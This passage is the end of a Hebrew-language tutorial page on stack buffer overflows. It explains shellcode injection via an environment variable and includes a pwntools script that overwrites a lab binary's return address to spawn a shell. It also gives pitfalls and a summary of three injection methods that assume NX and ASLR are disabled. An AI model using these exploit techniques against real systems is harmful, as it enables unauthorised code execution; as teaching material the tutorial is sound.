+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>SC<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>at<span class="w"> </span>0xffffd8e0
+</code></pre></div>
+<p>מה זה התיקון המוזר <code>(strlen(argv[0]) - strlen(argv[2])) * 2</code>? הכתובת של משתני הסביבה על המחסנית תלויה באורך <strong>שם התוכנית</strong> (<code>argv[0]</code>), כי גם הוא מאוחסן בראש המחסנית ליד הסביבה. אם נריץ את תוכנית העזר עם שם באורך שונה מהמטרה, הכתובת תזוז. התיקון מפצה על ההפרש. הדרך הבטוחה ביותר: להריץ את המטרה עם בדיוק אותה שורת הפעלה (<code>./vuln32</code>), ואם עדיין יש סטייה - לאמת את הכתובת ב-gdb עם <code>search -s SC</code>, ולהוסיף מזחלת גדולה שתבלע שגיאות קטנות.</p>
+<p>עכשיו התקיפה עצמה פשוטה: פשוט שמים את הכתובת של <code>SC</code> בהreturn address. ה-shellcode כבר יושב שם, בתוך משתנה הסביבה, מוכן לרוץ:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="ch">#!/usr/bin/env python3</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./vuln32&#39;</span><span class="p">)</span>
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;i386&#39;</span>
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="n">offset</span> <span class="o">=</span> <span class="mi">76</span>
+<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="n">sc_addr</span> <span class="o">=</span> <span class="mh">0xffffd8e0</span> <span class="o">+</span> <span class="mi">100</span>    <span class="c1"># address of SC + entry into the NOP sled</span>
+<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>
+<a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sc_addr</span><span class="p">)</span>
+<a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>
+<a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln32&#39;</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;SC&#39;</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x90</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">400</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">sh</span><span class="p">())})</span>
+<a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>היתרון הגדול: ה-shellcode לא מוגבל בגודל הbuffer - הוא יכול להיות ארוך ככל שנרצה, עם מזחלת ענקית. החיסרון: כמו שיטה א, זה מסתמך על כתובת יציבה, ולכן דורש ASLR כבוי.</p>
+<h2 id="_1">מלכודות נפוצות וטיפים<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<ul>
+<li><strong>בתים אסורים בקלט</strong>. אם התוכנית קוראת עם <code>gets</code>, <code>scanf("%s")</code> או <code>strcpy</code>, בית <code>\x00</code> (ולפעמים גם <code>\n</code> ורווח) יקטע את הקלט. זו בעיה כפולה: כתובות מחסנית ב-64 ביט מכילות בתים אפסיים (<code>0x00007fff...</code>), וגם ה-shellcode עצמו עלול. עם <code>read</code> אין בעיה. אחרת, צריך shellcode "נקי" (פרק 3.3) וכתובות בלי אפסים.</li>
+<li><strong>סדר בתים בכתובות 64 ביט</strong>. כתובת מחסנית טיפוסית היא <code>0x00007fffffffde90</code> - שני הבתים העליונים אפסים. אם הקלט נקטע ב-null, כתובת כזו חייבת להיות <strong>הדבר האחרון</strong> בpayload (כי הכול שאחריה ייקטע). עם <code>read</code> זה לא מפריע.</li>
+<li><strong>הכלי gdb משקר לכם על הכתובות</strong>. כפי שהסברנו, הסביבה של gdb שונה מהרצה רגילה, אז כתובת המחסנית זזה. אל תתפלאו אם exploit "עובד ב-gdb ולא בטרמינל" או להפך. הפתרון: מזחלת גדולה, או <code>gdb.attach()</code> לתהליך אמיתי, או שיטת ה-<code>jmp rsp</code> שלא תלויה בכתובת מחסנית בכלל.</li>
+<li><strong>באמת כיביתם NX?</strong> אם הקפיצה ל-shellcode מקבלת <code>SIGSEGV</code> מיד, בדקו שוב עם <code>checksec</code> ו-<code>readelf -l | grep STACK</code>. שכחה של <code>-z execstack</code> היא הטעות הכי נפוצה כאן.</li>
+<li><strong>מתי מעדיפים איזו שיטה.</strong> <code>jmp rsp</code> היא הבחירה הראשונה כשיש גאדג'ט זמין, כי היא לא תלויה בכתובות ועובדת גם עם ASLR. כתובת ישירה עם מזחלת פשוטה מאוד כשה-ASLR כבוי. משתנה סביבה שימושי כשהbuffer קטן מדי או כשתוקפים בינארי setuid נפרד שאפשר להשפיע על הסביבה שלו.</li>
+</ul>
+<h2 id="_2">סיכום<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<ul>
+<li>הinjection shellcode היא ההתקפה הקלאסית: כותבים את ה-shellcode לתוך הזיכרון שאנחנו שולטים בו, דורסים את הreturn address, ומכוונים אותה בחזרה אל ה-shellcode.</li>
+<li>התנאי ההכרחי הוא <strong>מחסנית ניתנת להרצה</strong> (NX כבוי), נבנית עם <code>-z execstack</code> ונבדקת עם <code>checksec</code> (<code>NX disabled</code>) או <code>readelf -l</code> (<code>RWE</code>).</li>
+<li><strong>שיטה א - כתובת ישירה</strong>: כש-ASLR כבוי מוצאים את כתובת הbuffer ב-gdb ומשתמשים בה. סופגים אי-דיוק עם <strong>מזחלת NOP</strong> (רצף <code>0x90</code>) שמאפשרת לקפוץ לאנשהו לפניה.</li>
+<li><strong>שיטה ב - טרמפולינה jmp rsp/jmp esp</strong>: מנצלים ש-<code>rsp</code> מצביע על ה-shellcode ברגע ה-<code>ret</code>, וקופצים אליו דרך גאדג'ט קבוע (<code>ff e4</code>) בבינארי. לא תלוי בכתובת מחסנית, <strong>עובד גם עם ASLR</strong> כי הבינארי לא PIE.</li>
+<li><strong>שיטה ג - משתנה סביבה</strong>: מכניסים shellcode + מזחלת למשתנה סביבה, מחשבים את כתובתו עם <code>getenvaddr</code> (ומאמתים ב-gdb), וקופצים לשם. שימושי כשהbuffer קטן מדי.</li>
+<li>מלכודות מרכזיות: בתים אסורים בקלט (<code>gets</code>/<code>scanf</code> מול <code>read</code>), ההבדל בין הסביבה של gdb להרצה אמיתית, ובתים אפסיים בכתובות 64 ביט.</li>
+<li>כל זה מניח NX כבוי. מול NX פעיל אף שיטה כאן לא תעבוד, וניפגש עם הפתרונות (ret2libc, ROP) בפרקים הבאים.</li>
+</ul>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="עדכון אחרון">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime" title="15 ביולי 2026 19:14:25 UTC">2026-07-15 19:14:25</span>
+  </span>
+
+    
+    
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  חזרה למעלה
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["navigation.tabs", "navigation.indexes", "navigation.top", "navigation.prune", "navigation.path", "search.highlight", "search.suggest", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u05d4\u05d5\u05e2\u05ea\u05e7 \u05dc\u05dc\u05d5\u05d7", "clipboard.copy": "\u05d4\u05e2\u05ea\u05e7\u05d4 \u05dc\u05dc\u05d5\u05d7", "search.result.more.one": "\u05e2\u05d5\u05d3 \u05d0\u05d7\u05d3 \u05d1\u05d3\u05e3 \u05d4\u05d6\u05d4", "search.result.more.other": "\u05e2\u05d5\u05d3 # \u05d1\u05d3\u05e3 \u05d4\u05d6\u05d4", "search.result.none": "\u05d0\u05d9\u05df \u05de\u05e1\u05de\u05db\u05d9\u05dd \u05ea\u05d5\u05d0\u05de\u05d9\u05dd", "search.result.one": "\u05de\u05e1\u05de\u05da1 \u05ea\u05d5\u05d0\u05dd", "search.result.other": "# \u05de\u05e1\u05de\u05da \u05ea\u05d5\u05d0\u05dd", "search.result.placeholder": "\u05d9\u05e9 \u05dc\u05d4\u05e7\u05dc\u05d9\u05d3 \u05db\u05d3\u05d9 \u05dc\u05d4\u05ea\u05d7\u05d9\u05dc \u05dc\u05d7\u05e4\u05e9", "search.result.term.missing": "\u05d7\u05e1\u05e8", "select.version": "\u05d1\u05d7\u05d9\u05e8\u05ea \u05d2\u05e8\u05e1\u05d4"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../../../javascripts/progress.js"></script>
+      
+        <script src="../../../../javascripts/tabs-dropdown.js"></script>
+      
+        <script src="../../../../javascripts/theme-switcher.js"></script>
+      
+        <script src="../../../../javascripts/recent-posts.js"></script>
+      
+    
+  </body>
+</html>
